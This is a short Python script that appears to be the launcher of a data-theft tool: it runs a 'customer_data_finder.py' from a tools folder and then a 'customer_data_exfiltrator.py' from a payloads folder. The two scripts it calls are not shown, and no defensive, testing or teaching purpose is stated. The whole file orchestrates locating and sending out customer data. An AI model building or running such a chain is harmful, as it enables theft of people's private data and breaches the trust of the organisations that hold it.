import subprocess
import os

def main():
    # Run the customer data finder
    customer_data_finder_path = os.path.join(os.path.dirname(__file__), "tools", "customer_data_finder.py")
    subprocess.run(["python3", customer_data_finder_path])

    # Run the customer data exfiltrator
    customer_data_exfiltrator_path = os.path.join(os.path.dirname(__file__), "payloads", "customer_data_exfiltrator.py")
    subprocess.run(["python3", customer_data_exfiltrator_path])

if __name__ == "__main__":
    main()
